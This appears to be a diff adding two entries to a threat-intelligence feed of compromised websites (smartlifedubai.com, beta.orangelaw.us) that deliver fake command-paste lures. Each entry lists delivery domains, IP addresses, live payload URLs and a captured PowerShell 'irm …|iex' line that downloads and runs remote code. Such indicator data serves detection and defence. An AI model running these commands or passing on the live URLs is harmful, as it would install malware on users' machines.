@@ -480,5 +480,55 @@
     ],
     "ReportId": "cmwuwwrc505ra0nmluu7bv6rm",
     "ScannedAt": "2026-11-24T16:31:46.051000+00:00"
+  },
+  {
+    "UrlDomain": "smartlifedubai.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/click/8117764681afc8de"
+    ],
+    "IP": [
+      "198.38.94.5"
+    ],
+    "Related": [
+      {
+        "Value": "i",
+        "Type": "Hostname"
+      }
+    ],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/click/8117764681afc8de')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/click/8117764681afc8de"
+    ],
+    "ReportId": "cmwuye3j107k00nmls10wj0uc",
+    "ScannedAt": "2026-11-24T17:13:14.656000+00:00"
+  },
+  {
+    "UrlDomain": "beta.orangelaw.us",
+    "DeliveryUrl": [
+      "img-codes-cloude.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "148.135.128.87"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/c5dee301a82e8e70",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://img-codes-cloude.info/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'img-codes-cloude[.]info/c5dee301a82e8e70'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://img-codes-cloude.info/c5dee301a82e8e70"
+    ],
+    "ReportId": "cmwuy1res077h0nmly52hc6wy",
+    "ScannedAt": "2026-11-24T17:03:39.058000+00:00"
   }
 ]
